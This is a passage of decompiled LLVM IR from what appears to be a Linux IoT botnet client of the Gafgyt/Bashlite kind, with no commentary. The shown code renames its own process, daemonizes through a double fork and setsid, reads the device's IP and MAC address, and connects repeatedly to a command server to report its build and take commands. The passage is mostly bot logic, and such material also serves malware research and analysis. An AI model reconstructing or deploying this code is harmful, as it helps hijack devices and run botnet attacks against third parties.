  %v6_80505a9 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_80505c6 = call i32 @fdgets(i32 %v2_80505ae, i32 4096, i32 %v5_8050549)
  %v1_80505cb = icmp eq i32 %v5_80505c6, 0
  %v1_80505cd = icmp eq i1 %v1_80505cb, false
  br i1 %v1_80505cd, label %dec_label_pc_8050553, label %dec_label_pc_80505cf

dec_label_pc_80505cf:                             ; preds = %dec_label_pc_8050532, %dec_label_pc_805058d, %dec_label_pc_8050585
  %v2_80505d5 = call i32 @__libc_close(i32 %v5_8050549)
  %v3_80505da = load i8, i8* %stack_var_-4156, align 1
  %v4_80505e1 = icmp eq i8 %v3_80505da, 0
  br i1 %v4_80505e1, label %dec_label_pc_8050647, label %dec_label_pc_80505e5

dec_label_pc_80505e5:                             ; preds = %dec_label_pc_80505cf
  %v2_80505ef = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_80505ef, i32* @eax, align 4
  %tmp32 = bitcast i32* %stack_var_-4188 to i8*
  %v5_80505f8 = call i32 @strcpy(i8* %tmp32, i32 %v2_80505ae)
  %v5_8050615 = call i32 @ioctl(i32 %v5_8050465, i32 35111, i32 %v2_80505ef)
  %v2_805062c = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_8050623

dec_label_pc_8050623:                             ; preds = %dec_label_pc_80505e5, %dec_label_pc_8050623
  %storemerge33 = phi i32 [ 0, %dec_label_pc_80505e5 ], [ %v4_805063e, %dec_label_pc_8050623 ]
  %v2_8050632 = add i32 %storemerge33, %v2_805062c
  %v1_8050635 = inttoptr i32 %v2_8050632 to i8*
  %v2_8050635 = load i8, i8* %v1_8050635, align 1
  %v3_8050638 = add i32 %storemerge33, ptrtoint (i8** @global_var_805c530.447 to i32)
  %v4_8050638 = inttoptr i32 %v3_8050638 to i8*
  store i8 %v2_8050635, i8* %v4_8050638, align 1
  %v4_805063e = add nuw nsw i32 %storemerge33, 1
  %exitcond = icmp eq i32 %v4_805063e, 6
  br i1 %exitcond, label %dec_label_pc_8050647, label %dec_label_pc_8050623

dec_label_pc_8050647:                             ; preds = %dec_label_pc_8050623, %dec_label_pc_80505cf
  %v2_805064d = call i32 @__libc_close(i32 %v5_8050465)
  br label %dec_label_pc_8050660

dec_label_pc_8050660:                             ; preds = %entry, %dec_label_pc_8050482, %dec_label_pc_80504fa, %dec_label_pc_8050647
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_8050647 ], [ 0, %dec_label_pc_80504fa ], [ 0, %dec_label_pc_8050482 ], [ 0, %entry ]
  %v2_8050666 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050666, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i8* %storemerge5, { 0, 2, 1 }
  uselistorder i32 %v2_80505ae, { 1, 3, 2, 0 }
  uselistorder i32 %v5_8050549, { 1, 2, 0 }
  uselistorder i32 %v5_8050465, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 3, 1, 0, 2 }
  uselistorder i32 (i16)* @htons, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_8050660, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050623, { 1, 0 }
  uselistorder label %dec_label_pc_80505cf, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805057b, { 1, 0 }
  uselistorder label %dec_label_pc_8050553, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([9 x i8]* @global_var_8059b89.448 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8050672 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8050672, i32* %stack_var_-24, align 4
  %v5_8050683 = icmp ult i32* %stack_var_-24, inttoptr (i32 5864 to i32*)
  store i1 %v5_8050683, i1* %cf.global-to-local, align 1
  %v1_805069c = add i32 %v2_8050672, 4
  %v2_805069c = inttoptr i32 %v1_805069c to i32*
  %v3_805069c = load i32, i32* %v2_805069c, align 4
  %v1_805069f = inttoptr i32 %v3_805069c to i32*
  %v2_805069f = load i32, i32* %v1_805069f, align 4
  store i1 false, i1* @df, align 1
  %v4_80506af = inttoptr i32 %v2_805069f to i8*
  store i32 %v2_805069f, i32* @edi, align 4
  %v3_80506b5 = call i32 @_strlen(i8* %v4_80506af)
  %v3_80506c4 = load i32, i32* %v2_805069c, align 4
  %v1_80506c7 = inttoptr i32 %v3_80506c4 to i32*
  %v2_80506c7 = load i32, i32* %v1_80506c7, align 4
  store i32 %v2_80506c7, i32* %stack_var_-5888, align 4
  %v4_80506d8 = inttoptr i32 %v2_80506c7 to i8*
  %v5_80506d8 = call i32 @strncpy(i8* %v4_80506d8, i32 ptrtoint (i32* @global_var_8059b92.449 to i32), i32 %v3_80506b5)
  store i32 %v2_8050672, i32* @esi, align 4
  %v3_80506e8 = load i32, i32* %v2_805069c, align 4
  %v2_80506eb = inttoptr i32 %v3_80506e8 to i32*
  store i32 ptrtoint (i32* @global_var_8059b92.449 to i32), i32* %v2_80506eb, align 4
  store i32 15, i32* %stack_var_-5888, align 4
  %v6_8050713 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_8059b92.449 to i32), i32 0, i32 0, i32 0)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_805071f = call i32 @__GI_time(i32* null)
  store i32 %v2_805071f, i32* @ebx, align 4
  %v0_8050726 = call i32 @__libc_getpid()
  %v1_805072b = load i32, i32* @ebx, align 4
  %v2_805072b = xor i32 %v1_805072b, %v0_8050726
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_805072b, i32* @eax, align 4
  store i32 %v2_805072b, i32* %stack_var_-5888, align 4
  %v1_8050730 = call i32 @srand(i32 %v2_805072b)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_805073c = call i32 @__GI_time(i32* null)
  store i32 %v2_805073c, i32* @ebx, align 4
  %v0_8050743 = call i32 @__libc_getpid()
  %v1_8050748 = load i32, i32* @ebx, align 4
  %v2_8050748 = xor i32 %v1_8050748, %v0_8050743
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_8050748, i32* %stack_var_-5888, align 4
  %v1_805074d = call i32 @init_rand(i32 %v2_8050748)
  store i32 ptrtoint ([19 x i8]* @global_var_8059b93.450 to i32), i32* @eax, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_8059b93.450 to i32), i32* %stack_var_-5888, align 4
  %v3_805076e = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_8059b93.450 to i32), i32 ptrtoint ([2 x i8]* @global_var_8059ba6.451 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050776 = icmp eq i32 %v3_805076e, 0
  %v1_805077a = icmp eq i1 %v4_8050776, false
  br i1 %v1_805077a, label %dec_label_pc_8050799, label %dec_label_pc_805077c

dec_label_pc_805077c:                             ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_8059ba8.452 to i32), i32* @eax, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_8059ba8.452 to i32), i32* %stack_var_-5888, align 4
  %v3_8050791 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_8059ba8.452 to i32), i32 ptrtoint ([2 x i8]* @global_var_8059ba6.451 to i32))
  br label %dec_label_pc_8050799

dec_label_pc_8050799:                             ; preds = %entry, %dec_label_pc_805077c
  %stack_var_-88.0 = phi i32 [ %v3_805076e, %entry ], [ %v3_8050791, %dec_label_pc_805077c ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8059b93.450, i32 0, i32 0), %entry ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059ba8.452, i32 0, i32 0), %dec_label_pc_805077c ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050799 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_8050799, label %dec_label_pc_805093b, label %dec_label_pc_80507a3

dec_label_pc_80507a3:                             ; preds = %dec_label_pc_8050799
  %v3_80507a9 = load i32, i32* %v2_805069c, align 4
  %v1_80507ac = inttoptr i32 %v3_80507a9 to i32*
  %v2_80507ac = load i32, i32* %v1_80507ac, align 4
  store i1 false, i1* @df, align 1
  %v4_80507bc = inttoptr i32 %v2_80507ac to i8*
  store i32 %v2_80507ac, i32* @edi, align 4
  %v3_80507c2 = call i32 @_strlen(i8* %v4_80507bc)
  %v2_80507db = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_80507db, i32* %stack_var_-5888, align 4
  %v3_80507e4 = call i32 @getcwd(i32 %v2_80507db, i32 256)
  store i1 false, i1* @df, align 1
  %v4_805080a = bitcast i32* %stack_var_-368 to i8*
  store i32 %v2_80507db, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_8059bb5.453 to i32), i32* @edi, align 4
  %v7_805081c = call i32 @_strncmp(i8* %v4_805080a, i8* bitcast (i8** @global_var_8059bb5.453 to i8*), i32 2)
  %v8_805081c = urem i32 %v7_805081c, 2
  %v9_805081c = icmp eq i32 %v8_805081c, 0
  %v0_805081e = load i1, i1* @cf, align 1
  %v2_805081e = or i1 %v0_805081e, %v9_805081c
  %v3_805081e = zext i1 %v2_805081e to i8
  %v7_805081e = xor i8 %v3_805081e, 1
  %v5_8050821 = ptrtoint i32* %stack_var_-512 to i32
  %v3_8050824 = and i32 %v7_805081c, -256
  %v3_8050826 = trunc i32 %v5_8050821 to i8
  %v4_8050826 = sub i8 %v7_805081e, %v3_8050826
  %v15_8050826 = icmp eq i8 %v4_8050826, 0
  %v20_8050826 = zext i8 %v4_8050826 to i32
  %v23_8050826 = or i32 %v20_8050826, %v3_8050824
  store i32 %v23_8050826, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_8050826, label %dec_label_pc_8050930, label %dec_label_pc_805083a

dec_label_pc_8050837:                             ; preds = %dec_label_pc_805083a
  %v4_8050837 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_805083a

dec_label_pc_805083a:                             ; preds = %dec_label_pc_80507a3, %dec_label_pc_8050837
  %stack_var_-84.0 = phi i32 [ %v4_8050837, %dec_label_pc_8050837 ], [ %v3_80507c2, %dec_label_pc_80507a3 ]
  store i32 %v2_8050672, i32* @esi, align 4
  %v3_8050840 = load i32, i32* %v2_805069c, align 4
  %v1_8050843 = inttoptr i32 %v3_8050840 to i32*
  %v2_8050843 = load i32, i32* %v1_8050843, align 4
  %v2_8050848 = add i32 %v2_8050843, %stack_var_-84.0
  %v1_805084b = inttoptr i32 %v2_8050848 to i8*
  %v2_805084b = load i8, i8* %v1_805084b, align 1
  %v6_805084e = icmp ult i8 %v2_805084b, 47
  store i1 %v6_805084e, i1* %cf.global-to-local, align 1
  %v10_805084e = icmp eq i8 %v2_805084b, 47
  %v1_8050850 = icmp eq i1 %v10_805084e, false
  br i1 %v1_8050850, label %dec_label_pc_8050837, label %dec_label_pc_8050852

dec_label_pc_8050852:                             ; preds = %dec_label_pc_805083a
  store i32 %v2_8050672, i32* @edi, align 4
  %v3_8050858 = load i32, i32* %v2_805069c, align 4
  %v1_805085b = inttoptr i32 %v3_8050858 to i32*
  %v2_805085b = load i32, i32* %v1_805085b, align 4
  %v2_8050860 = add i32 %v2_805085b, %stack_var_-84.0
  %v2_8050879 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_8050879, i32* %stack_var_-5888, align 4
  %v5_8050882 = call i32 @sprintf(i32 %v2_8050879, i32 ptrtoint ([8 x i8]* @global_var_8059bb7.454 to i32), i32 %v2_80507db, i32 %v2_8050860)
  %v1_80508cb = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_8050898 = ptrtoint i32* %stack_var_-1648 to i32
  %v3_80508b9 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_80508c5.outer

dec_label_pc_8050889:                             ; preds = %dec_label_pc_80508c5
  store i32 %v2_8050898, i32* %stack_var_-5888, align 4
  %v4_80508a1 = call i32 @fgets(i32 %v2_8050898, i32 1024, i32 %stack_var_-88.0)
  store i32 %v2_8050898, i32* %stack_var_-5888, align 4
  %v4_80508b9 = call i32 @__GI_strcasecmp(i8* %v3_80508b9, i32 %v2_8050879)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80508be = icmp eq i32 %v4_80508b9, 0
  %v1_80508c0 = icmp eq i1 %v1_80508be, false
  br i1 %v1_80508c0, label %dec_label_pc_80508c5, label %dec_label_pc_80508c2

dec_label_pc_80508c2:                             ; preds = %dec_label_pc_8050889
  %v4_80508c2 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_80508c5.outer

dec_label_pc_80508c5.outer:                       ; preds = %dec_label_pc_80508c2, %dec_label_pc_8050852
  %stack_var_-80.0.ph = phi i32 [ %v4_80508c2, %dec_label_pc_80508c2 ], [ 0, %dec_label_pc_8050852 ]
  br label %dec_label_pc_80508c5

dec_label_pc_80508c5:                             ; preds = %dec_label_pc_80508c5.outer, %dec_label_pc_8050889
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_80508cb = call i32 @feof(i16* %v1_80508cb)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80508d0 = icmp eq i32 %v2_80508cb, 0
  br i1 %v1_80508d0, label %dec_label_pc_8050889, label %dec_label_pc_80508d4

dec_label_pc_80508d4:                             ; preds = %dec_label_pc_80508c5
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80508d4 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_80508d8 = icmp eq i1 %v4_80508d4, false
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_8050929 = call i32 @__GI_fclose(i16* %v1_80508cb)
  br i1 %v1_80508d8, label %dec_label_pc_805093b, label %dec_label_pc_80508da

dec_label_pc_80508da:                             ; preds = %dec_label_pc_80508d4
  %v4_80508ed = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_80508ed, i32* @eax, align 4
  store i32 %v4_80508ed, i32* %stack_var_-5888, align 4
  %v3_80508f3 = call i32 @__GI_fopen(i32 %v4_80508ed, i32 ptrtoint (i32* @global_var_8059bbf.455 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80508fb = icmp eq i32 %v3_80508f3, 0
  br i1 %v4_80508fb, label %dec_label_pc_805093b, label %dec_label_pc_8050901

dec_label_pc_8050901:                             ; preds = %dec_label_pc_80508da
  store i32 %v2_8050879, i32* %stack_var_-5888, align 4
  %v3_8050911 = call i32 @__GI_fputs(i32 %v2_8050879, i32 %v3_80508f3)
  store i32 %v3_80508f3, i32* @eax, align 4
  store i32 %v3_80508f3, i32* %stack_var_-5888, align 4
  %v1_805091c = inttoptr i32 %v3_80508f3 to i16*
  %v2_805091c = call i32 @__GI_fclose(i16* %v1_805091c)
  br label %dec_label_pc_805093b

dec_label_pc_8050930:                             ; preds = %dec_label_pc_80507a3
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v1_8050936 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_8050936 = call i32 @__GI_fclose(i16* %v1_8050936)
  br label %dec_label_pc_805093b

dec_label_pc_805093b:                             ; preds = %dec_label_pc_80508d4, %dec_label_pc_80508da, %dec_label_pc_8050799, %dec_label_pc_8050901, %dec_label_pc_8050930
  %v0_805093b = call i32 @getOurIP()
  %v0_8050940 = load i32, i32* %stack_var_-5888, align 4
  %v1_8050940 = call i32 @__libc_fork(i32 %v0_8050940)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050948 = icmp eq i32 %v1_8050940, 0
  br i1 %v4_8050948, label %dec_label_pc_805097a, label %dec_label_pc_80509a9

dec_label_pc_805097a:                             ; preds = %dec_label_pc_805093b
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_805097a = load i32, i32* %stack_var_-5888, align 4
  %v1_805097a = call i32 @__libc_fork(i32 %v0_805097a)
  store i32 %v1_805097a, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050982 = icmp eq i32 %v1_805097a, 0
  br i1 %v4_8050982, label %dec_label_pc_8050994.thread, label %dec_label_pc_805099a

dec_label_pc_8050994.thread:                      ; preds = %dec_label_pc_805097a
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80509b6

dec_label_pc_805099a:                             ; preds = %dec_label_pc_805097a
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_805098f = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8059bc1.456 to i32), i32* %stack_var_-5888, align 4
  %v1_80509a2 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8059bc1.456 to i32))
  br label %dec_label_pc_80509b6

dec_label_pc_80509a9:                             ; preds = %dec_label_pc_805093b
  %v2_8050956 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v1_8050940, i32* %stack_var_-5888, align 4
  %v4_8050963 = call i32 @__libc_waitpid(i32 %v1_8050940, i32 %v2_8050956, i32 0)
  store i32 %v4_8050963, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_805096f = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8059bc1.456 to i32), i32* %stack_var_-5888, align 4
  %v1_80509b1 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8059bc1.456 to i32))
  br label %dec_label_pc_80509b6

dec_label_pc_80509b6:                             ; preds = %dec_label_pc_8050994.thread, %dec_label_pc_805099a, %dec_label_pc_80509a9
  %v0_80509b6 = call i32 @__GI_setsid()
  store i32 ptrtoint (i8** @global_var_8059bb5.453 to i32), i32* %stack_var_-5888, align 4
  %v1_80509c2 = call i32 @chdir(i32 ptrtoint (i8** @global_var_8059bb5.453 to i32))
  store i32 13, i32* %stack_var_-5888, align 4
  %v3_80509d6 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_8051093 = ptrtoint i32* %stack_var_-5744 to i32
  %tmp121 = bitcast i32* %stack_var_-5744 to i8*
  %tmp122 = bitcast i8** %stack_var_-36 to i32*
  %v2_8050e82 = ptrtoint i32* %stack_var_-1648 to i32
  %v4_8050e9e = bitcast i32* %stack_var_-1648 to i8*
  %v1_8050cff = or i32 %v2_8051093, 1
  %storemerge13127 = inttoptr i32 %v1_8050cff to i8*
  br label %dec_label_pc_80509dd.outer

dec_label_pc_80509dd.outer:                       ; preds = %dec_label_pc_8050cbf, %dec_label_pc_8051093, %dec_label_pc_80509b6
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_80509b6 ], [ %stack_var_-96.2.ph, %dec_label_pc_8051093 ], [ %v4_8050cbf, %dec_label_pc_8050cbf ]
  %v0_80509dd24 = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80509e225 = icmp eq i32 %v0_80509dd24, 0
  br i1 %v1_80509e225, label %dec_label_pc_80509f4, label %dec_label_pc_80509e6

dec_label_pc_80509e6:                             ; preds = %dec_label_pc_80509dd.outer, %dec_label_pc_80509e6
  store i32 30, i32* %stack_var_-5888, align 4
  %v1_80509ed = call i32 @sleep(i32 30)
  %v0_80509dd = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80509e2 = icmp eq i32 %v0_80509dd, 0
  br i1 %v1_80509e2, label %dec_label_pc_80509f4, label %dec_label_pc_80509e6

dec_label_pc_80509f4:                             ; preds = %dec_label_pc_80509e6, %dec_label_pc_80509dd.outer
  %v0_80509f4 = load i32, i32* @global_var_80627a8.240, align 8
  store i32 %v0_80509f4, i32* %stack_var_-5888, align 4
  %v1_80509fc = call i32 @__GI_inet_ntoa(i32 %v0_80509f4)
  store i32 %v1_80509fc, i32* @ebx, align 4
  %v0_8050a03 = call i32 @getBuild()
  %v0_8050a08 = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_8050a08, i32* %stack_var_-5888, align 4
  %v3_8050a21 = call i32 @sockprintf(i32 %v0_8050a08, i32 ptrtoint ([12 x i8]* @global_var_8059bce.457 to i32))
  br label %dec_label_pc_8051093.outer

dec_label_pc_8050a45:                             ; preds = %dec_label_pc_8050c36, %dec_label_pc_8050bee
  %v2_8050a48 = mul i32 %storemerge14, 4
  %v9_8050a48 = and i32 %storemerge14, 1073741824
  %v10_8050a48 = icmp ne i32 %v9_8050a48, 0
  store i1 %v10_8050a48, i1* %cf.global-to-local, align 1
  %v0_8050a4d = load i32, i32* @global_var_80627b4.36, align 4
  %v2_8050a52 = add i32 %v0_8050a4d, %v2_8050a48
  %v1_8050a55 = inttoptr i32 %v2_8050a52 to i32*
  %v2_8050a55 = load i32, i32* %v1_8050a55, align 4
  store i32 %v2_8050a55, i32* %stack_var_-5888, align 4
  %v4_8050a6a = call i32 @__libc_waitpid(i32 %v2_8050a55, i32 0, i32 1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp123 = icmp slt i32 %v4_8050a6a, 1
  %.pre = add i32 %storemerge14, 1
  br i1 %tmp123, label %dec_label_pc_8050beb, label %dec_label_pc_8050a77

dec_label_pc_8050a77:                             ; preds = %dec_label_pc_8050a45
  br label %dec_label_pc_8050aaa

dec_label_pc_8050a80:                             ; preds = %dec_label_pc_8050aaa, %dec_label_pc_8050ae4
  %v2_8050a83 = mul i32 %storemerge16, 4
  %v0_8050a88 = load i32, i32* @global_var_80627b4.36, align 4
  %v2_8050a8d = add i32 %v0_8050a88, %v2_8050a83
  %v1_8050a90 = add i32 %v2_8050a8d, -4
  %v1_8050aa3 = inttoptr i32 %v2_8050a8d to i32*
  %v2_8050aa3 = load i32, i32* %v1_8050aa3, align 4
  %v2_8050aa5 = inttoptr i32 %v1_8050a90 to i32*
  store i32 %v2_8050aa3, i32* %v2_8050aa5, align 4
  %v4_8050aa7 = add i32 %storemerge16, 1
  br label %dec_label_pc_8050aaa

dec_label_pc_8050aaa:                             ; preds = %dec_label_pc_8050a77, %dec_label_pc_8050a80
  %storemerge16 = phi i32 [ %v4_8050aa7, %dec_label_pc_8050a80 ], [ %.pre, %dec_label_pc_8050a77 ]
  %v0_8050abe = load i32, i32* @global_var_805c528.34, align 8
  %v0_8050ac4 = load i32, i32* @global_var_805c52c.35, align 4
  %v10_8050adc = icmp eq i32 %v0_8050ac4, 0
  br i1 %v10_8050adc, label %dec_label_pc_8050ae4, label %dec_label_pc_8050a80

dec_label_pc_8050ae4:                             ; preds = %dec_label_pc_8050aaa
  store i32 0, i32* @esi, align 4
  store i32 %v0_8050abe, i32* @edi, align 4
  %v10_8050af8 = icmp ult i32 %storemerge16, %v0_8050abe
  br i1 %v10_8050af8, label %dec_label_pc_8050a80, label %dec_label_pc_8050b00

dec_label_pc_8050b00:                             ; preds = %dec_label_pc_8050ae4
  %v2_8050b03 = mul i32 %storemerge16, 4
  %v0_8050b08 = load i32, i32* @global_var_80627b4.36, align 4
  %v2_8050b0d = add i32 %v2_8050b03, -4
  %v1_8050b10 = add i32 %v2_8050b0d, %v0_8050b08
  %v1_8050b13 = inttoptr i32 %v1_8050b10 to i32*
  store i32 0, i32* %v1_8050b13, align 4
  %v0_8050b19 = load i32, i32* @global_var_805c528.34, align 8
  %v0_8050b1e = load i32, i32* @global_var_805c52c.35, align 4
  %v1_8050b24 = add i32 %v0_8050b19, -1
  %v4_8050b24 = icmp ne i32 %v0_8050b19, 0
  %v2_8050b27 = zext i1 %v4_8050b24 to i32
  %v3_8050b27 = add i32 %v0_8050b1e, -1
  %v4_8050b27 = add i32 %v3_8050b27, %v2_8050b27
  store i32 %v1_8050b24, i32* @global_var_805c528.34, align 8
  store i32 %v4_8050b27, i32* @global_var_805c52c.35, align 4
  %v2_8050b44 = mul i32 %v1_8050b24, 4
  %v1_8050b47 = add i32 %v2_8050b44, 4
  %v5_8050b47 = icmp eq i32 %v2_8050b44, -4
  store i1 %v5_8050b47, i1* %cf.global-to-local, align 1
  store i32 %v1_8050b47, i32* %stack_var_-5888, align 4
  %v1_8050b4d = call i32 @malloc(i32 %v1_8050b47)
  br label %dec_label_pc_8050b80

dec_label_pc_8050b5e:                             ; preds = %dec_label_pc_8050b80, %dec_label_pc_8050bba
  %v2_8050b61 = mul i32 %storemerge15, 4
  %v5_8050b66 = add i32 %v2_8050b61, %v1_8050b4d
  %v0_8050b71 = load i32, i32* @global_var_80627b4.36, align 4
  %v2_8050b76 = add i32 %v0_8050b71, %v2_8050b61
  %v1_8050b79 = inttoptr i32 %v2_8050b76 to i32*
  %v2_8050b79 = load i32, i32* %v1_8050b79, align 4
  %v2_8050b7b = inttoptr i32 %v5_8050b66 to i32*
  store i32 %v2_8050b79, i32* %v2_8050b7b, align 4
  %v4_8050b7d = add i32 %storemerge15, 1
  br label %dec_label_pc_8050b80

dec_label_pc_8050b80:                             ; preds = %dec_label_pc_8050b00, %dec_label_pc_8050b5e
  %storemerge15 = phi i32 [ %v4_8050b7d, %dec_label_pc_8050b5e ], [ 0, %dec_label_pc_8050b00 ]
  %v0_8050b94 = load i32, i32* @global_var_805c528.34, align 8
  %v0_8050b9a = load i32, i32* @global_var_805c52c.35, align 4
  %v10_8050bb2 = icmp eq i32 %v0_8050b9a, 0
  br i1 %v10_8050bb2, label %dec_label_pc_8050bba, label %dec_label_pc_8050b5e

dec_label_pc_8050bba:                             ; preds = %dec_label_pc_8050b80
  store i32 0, i32* @esi, align 4
  store i32 %v0_8050b94, i32* @edi, align 4
  %v10_8050bce = icmp ult i32 %storemerge15, %v0_8050b94
  br i1 %v10_8050bce, label %dec_label_pc_8050b5e, label %dec_label_pc_8050bd6

dec_label_pc_8050bd6:                             ; preds = %dec_label_pc_8050bba
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_8050bd6 = load i32, i32* @global_var_80627b4.36, align 4
  store i32 %v0_8050bd6, i32* %stack_var_-5888, align 4
  %v1_8050bde = call i32 @free(i32 %v0_8050bd6)
  store i32 %v1_8050b4d, i32* @global_var_80627b4.36, align 4
  br label %dec_label_pc_8050beb

dec_label_pc_8050beb:                             ; preds = %dec_label_pc_8050a45, %dec_label_pc_8050bd6
  br label %dec_label_pc_8050bee

dec_label_pc_8050bee:                             ; preds = %dec_label_pc_8051093, %dec_label_pc_8050beb
  %storemerge14 = phi i32 [ %.pre, %dec_label_pc_8050beb ], [ 0, %dec_label_pc_8051093 ]
  %v1_8050bf7 = ashr i32 %storemerge14, 31
  %v0_8050bfe = load i32, i32* @global_var_805c528.34, align 8
  store i32 %v0_8050bfe, i32* @esi, align 4
  %v0_8050c04 = load i32, i32* @global_var_805c52c.35, align 4
  store i32 %v0_8050c04, i32* @edi, align 4
  %v10_8050c1c = icmp ult i32 %v1_8050bf7, %v0_8050c04
  store i1 %v10_8050c1c, i1* %cf.global-to-local, align 1
  br i1 %v10_8050c1c, label %dec_label_pc_8050a45, label %dec_label_pc_8050c28

dec_label_pc_8050c28:                             ; preds = %dec_label_pc_8050bee
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_8050c34 = icmp ugt i32 %v1_8050bf7, %v0_8050c04
  br i1 %v6_8050c34, label %dec_label_pc_8050c48, label %dec_label_pc_8050c36

dec_label_pc_8050c36:                             ; preds = %dec_label_pc_8050c28
  %v10_8050c3c = icmp ult i32 %storemerge14, %v0_8050bfe
  store i1 %v10_8050c3c, i1* %cf.global-to-local, align 1
  br i1 %v10_8050c3c, label %dec_label_pc_8050a45, label %dec_label_pc_8050c48

dec_label_pc_8050c48:                             ; preds = %dec_label_pc_8050c36, %dec_label_pc_8050c28
  %v0_8050c4b = load i32, i32* @ebp, align 4
  %v2_8050c4b = add i32 %v5_80510ae, -5736
  %v3_8050c4b = add i32 %v2_8050c4b, %v0_8050c4b
  %v4_8050c4b = inttoptr i32 %v3_8050c4b to i8*
  store i8 0, i8* %v4_8050c4b, align 1
  store i32 %v2_8051093, i32* %stack_var_-5888, align 4
  %v2_8050c5c = call i32 @trim(i8* %tmp121)
  store i32 %v2_8051093, i32* %stack_var_-5888, align 4
  %v4_8050c72 = call i32 @strstr(i32 %v2_8051093, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058937.21, i32 0, i32 0))
  %v7_8050c7f = icmp ult i32 %v4_8050c72, %v2_8051093
  store i1 %v7_8050c7f, i1* %cf.global-to-local, align 1
  %v12_8050c7f = icmp eq i32 %v4_8050c72, %v2_8051093
  %v1_8050c81 = icmp eq i1 %v12_8050c7f, false
  br i1 %v1_8050c81, label %dec_label_pc_8050c9d, label %dec_label_pc_8050c83

dec_label_pc_8050c83:                             ; preds = %dec_label_pc_8050c48
  %v0_8050c83 = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_8050c83, i32* %stack_var_-5888, align 4
  %v3_8050c93 = call i32 @sockprintf(i32 %v0_8050c83, i32 ptrtoint ([5 x i8]* @global_var_8059bda.458 to i32))
  br label %dec_label_pc_8051093

